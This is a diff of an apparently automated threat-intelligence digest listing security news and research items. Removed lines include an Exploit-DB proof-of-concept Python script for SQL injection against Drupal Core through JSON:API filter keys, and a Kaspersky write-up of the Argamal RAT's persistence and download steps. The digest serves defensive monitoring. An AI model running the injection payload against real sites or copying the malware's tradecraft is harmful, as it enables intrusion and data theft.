+- **Kaspersky Securelist** (threat_research_primary)
+  - Title: Argamal: Malware hidden in hentai games
+  - Published: 2026-06-03T09:00:22+00:00
+  - Link: https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/
+  - Summary: Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.
+
 ### Cluster 6a15521eed — score 10
 
 - Title: Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem
@@ -2479,45 +2508,6 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 1st June �
   - Published: 2026-06-01T14:43:11+00:00
   - Link: https://research.checkpoint.com/2026/1st-june-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 1st June, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Carnival Corporation, a global cruise line operator, has confirmed a data breach affecting nearly 6 million people after attackers used social engineering to compromise an employee account. Exposed information may include names, contact […] The post 1st June – Threat Intelligence Report appeared first on Check Point Research .
-
-### Cluster f9c11bd945 — score 10
-
-- Title: Argamal: Malware hidden in hentai games
-- Source: Kaspersky Securelist (threat_research_primary)
-- Published: 2026-06-03T09:00:22+00:00
-- Link: https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: threat_research
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- content_type: threat_research
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.
-```
-
-#### Full body
-
-```
-Table of Contents Technical details Background Delivery Script executor Malicious agent Other delivery methods Infrastructure Victims Attribution Conclusions Indicators of Compromise Authors Mikhail Reznichenko In April 2026, we discovered a new malware campaign targeting players of “hentai” games. Once launched, the infected games install a previously unknown malicious implant on the user’s machine. After a few days, the implant downloads and executes a Trojan, resulting in full system compromise and broad remote control capabilities for the attackers. We dubbed this malware family “Argamal”. The malware uses COM hijacking to persist on the victim’s machine, replacing the InprocServer32 entry for Windows Color System Calibration Loader DLL. This task is triggered when the user logs in, effectively allowing the malware to run at startup. Kaspersky solutions detect this threat as Trojan.Win32.Termixia.* , Trojan.Win32.Agent.* , HEUR:Trojan.Win32.Argamal.gen and HEUR:Trojan-Downloader.Win32.Argamal.gen . Technical details Background In April, as part of our ongoing monitoring of telemetry data, we found some suspicious DLLs. Further analysis revealed that various versions of these DLLs have existed since at least 2024. The DLLs were spawned by different games written using various game engines and programming languages, including RenPy (Python) and RPG Maker MV (JavaScript), among others. However, they all had one thing in common: they were all hentai games. We searched for the distribution sources and found a number of websites hosting game screenshots and download links. These links redirected users to PixelDrain, a free file transfer service. Adult games catalogue In addition to these websites, the trojanized games have also been distributed via different torrent trackers, including AniRena. Malicious game torrent in AniRena Delivery Both the dedicated websites and torrents delivered an archive containing the infected game. Contents of the game archive This archive contained fully functional, legitimate game files, as well as a modified FFmpeg DLL (SHA1: 42add9475e67a1ccc6a6af94b5475d3defc01b85 ), that imported the DllGetClassObject function from a file called natives2_blob.bin . Since the game needs ffmpeg.dll to run properly, the library loads as soon as the user starts the game. Script executor The natives2_blob.bin (SHA1: edce72f59e4c1d136cd1946af70d334c19df858d ) file is a DLL that executes a Base64-encoded PowerShell script when loaded. The natives2_blob.bin file code This PowerShell script, which we’ll call Stage1 , performs basic checks for controlled environments. For example, it checks for the Sandboxie folder in Program Files and Procmon64 in the process list. If all the checks indicate that the process is not running in a controlled environment, it proceeds to establish persistence. Stage1 sets the MI_V environment variable (and also MI_V2 in the new versions of malware) for the current user to another Base64-encoded PowerShell script, which we’ll call Stage2 . After that, it sets the InprocServer32 registry key at HKCU\SOFTWARE\Classes\CLSID\{722D0F89-B69C-4700-AE8C-4A44350E4876} to a random DLL file name in a random subdirectory of %USER%\AppData\Local , as well as the ShellFolder subkey to another random DLL file name in the same location. Stage1 also creates a scheduled task that will execute three days later. This task executes Stage2 and runs once. Stage2 is a payload downloader script. It takes previously generated DLL filenames from the registry and downloads an encrypted payload called zaesdl.dat from GitHub using bitsadmin.exe . The downloaded payload is saved in the settings.dat file in the randomly chosen subdirectory of %USER%\AppData\Local . Stage2 decrypts it using AES-CBC with the key zbcd1j9234r670eh and an IV equal to the key. The decrypted payload is then saved in the DLL file specified in the ShellFolder registry subkey. The decrypted payload is set as InprocServer32 at HKCU\SOFTWARE\Classes\CL
-```
-
-#### Corroborating sources (1)
-
-- **Kaspersky Securelist** (threat_research_primary)
-  - Title: Argamal: Malware hidden in hentai games
-  - Published: 2026-06-03T09:00:22+00:00
-  - Link: https://securelist.com/argamal-rat-distributed-with-hentai-games/119999/
-  - Summary: Kaspersky researchers analyze new Argamal RAT distributed via infected hentai games and allowing the attacker to control the target machine.
 
 ### Cluster 1f5463ba47 — score 10
 
@@ -2697,20 +2687,18 @@ Kids Online Lessons for life: Why children’s data is a long-term identity risk
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-06-01T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52608
-- Fetch status: ok
+- Fetch status: fetch_failed:HTTPError
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: Drupal
 
 #### Cluster taxonomy (union across members)
 - affected_products: Drupal
-- cve_ids: CVE-2026-9082
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
 #### Primary article taxonomy
 - affected_products: Drupal
-- cve_ids: CVE-2026-9082
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -2718,12 +2706,6 @@ Kids Online Lessons for life: Why children’s data is a long-term identity risk
 
 ```
 Drupal Core 10.5.5 - Error-Based SQL Injection
-```
-
-#### Full body
-
-```
-Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Drupal Core 10.5.5 - Error-Based SQL Injection EDB-ID: 52608 CVE: 2026-9082 EDB Verified: Author: cardosource Type: webapps Exploit: / Platform: PHP Date: 2026-06-01 Vulnerable App: # Exploit Title: Drupal Core 10.5.5 - Error-Based SQL Injection # Google Dork: N/A # Date: 2026-05-31 # Exploit Author: cardosource # Vendor Homepage: https://www.drupal.org # Software Link: https://www.drupal.org/project/drupal # Version: Drupal Core 10.5.5 # Tested on: Debian Linux (Docker), PHP 8.2, Apache, PostgreSQL 17 # CVE: CVE-2026-9082 # # Description: # This proof-of-concept demonstrates an Error-Based SQL Injection in # Drupal Core 10.5.5 (PostgreSQL). User-controlled JSON:API filter # array keys influence SQL query construction, allowing database # information disclosure through SQL error messages. import requests import json from urllib.parse import urlencode TARGET_URL = "http://localhost:8080/jsonapi/node/article" BANNER = """ [+] Drupal Core 10.5.5 - Error-Based SQL Injection [+] CVE-2026-9082 [+] Target: JSON:API (PostgreSQL) """ def extract_data(subquery): headers = { "Accept": "application/vnd.api+json", "Content-Type": "application/vnd.api+json" } payload = f"0||CAST(({subquery}) AS INTEGER)" params = { "filter[my_filter][condition][path]": "title", "filter[my_filter][condition][operator]": "IN", "filter[my_filter][condition][value][0]": "Example", f"filter[my_filter][condition][value][{payload}]": "Injection" } try: response = requests.get(TARGET_URL, headers=headers, params=params, timeout=10) if response.status_code == 500: try: error = response.json().get("errors", [{}])[0].get("detail", "") if "invalid input syntax" in error: data = error.split('"')[1] if '"' in error else error print(f"\033[92m[SUCCESS]\033[0m {data}") except json.JSONDecodeError: pass except requests.exceptions.RequestException: pass if __name__ == "__main__": print(BANNER) extract_data("SELECT version()") Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
 ```
 
 #### Corroborating sources (1)
@@ -2758,7 +2740,7 @@ Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual 
 #### Summary
 
 ```
-Future’s Intelligence Grap® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.
+Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.
 ```
 
 #### Full body
@@ -2773,7 +2755,7 @@ Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage Thr
   - Title: Why Holistic Sourcing Wins: The Numbers Behind the Recorded Future Advantage
   - Published: 2026-06-05T00:00:00+00:00
   - Link: https://www.recordedfuture.com/blog/recorded-future-holistic-sourcing-wins
-  - Summary: Future’s Intelligence Grap® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.
+  - Summary: Recorded Future’s Intelligence Graph® uses holistic sourcing across 1M+ sources for complete threat intelligence and proactive defense.
 
 ### Cluster 2ef64738f9 — score 10
 
@@ -3712,6 +3694,39 @@ After a disgruntled security researcher published several zero-day exploits in r
   - Link: https://www.darkreading.com/application-security/microsoft-zero-day-legal-threats-backlash
   - Summary: After a disgruntled security researcher published several zero-day exploits in recent weeks, Microsoft seemingly indicated criminal charges were in order.
 
+### Cluster 8f36ac3451 — score 8
+
+- Title: Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award
+- Source: Infosecurity Magazine (cyber_news_breach_reporting)
+- Published: 2026-06-03T13:30:00+00:00
+- Link: https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era
+```
+
+#### Corroborating sources (1)
+
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - Title: Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award
+  - Published: 2026-06-03T13:30:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/
+  - Summary: Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era
+
 ### Cluster ac3891b02c — score 8
 
 - Title: New HTTP/2 Bomb Vulnerability Allows Remote DoS on NGINX, Apache, IIS, Envoy & Cloudflare
@@ -3781,39 +3796,6 @@ AI-driven exploitation timelines are rapidly shrinking, and they are not going t
   - Published: 2026-06-02T11:58:00+00:00
   - Link: https://thehackernews.com/2026/06/ai-driven-exploitation-is-destroying.html
   - Summary: AI-driven exploitation timelines are rapidly shrinking, and they are not going to stop shrinking. Vulnerabilities are being discovered, reproduced, and weaponized faster than ever in the history of enterprise security. As a result, the window between a vulnerability being disclosed and indiscriminate exploitation observed across the internet is now measured in hours, not days. The industry's
-
-### Cluster 8f36ac3451 — score 8
-
-- Title: Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award
-- Source: Infosecurity Magazine (cyber_news_breach_reporting)
-- Published: 2026-06-03T13:30:00+00:00
-- Link: https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era
-```
-
-#### Corroborating sources (1)
-
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - Title: Infosecurity Europe: Vulnerability Management Innovator Konvu Wins Cyber Startup Award
-  - Published: 2026-06-03T13:30:00+00:00
-  - Link: https://www.infosecurity-magazine.com/news/konvu-wins-cyber-startup-award/
-  - Summary: Inaugural Infosecurity Europe Cyber Startup Award Winner Impresses Panel with Ability Help Prioritize Vulnerabilities in AI era
 
 ### Cluster a5c944a483 — score 8
 
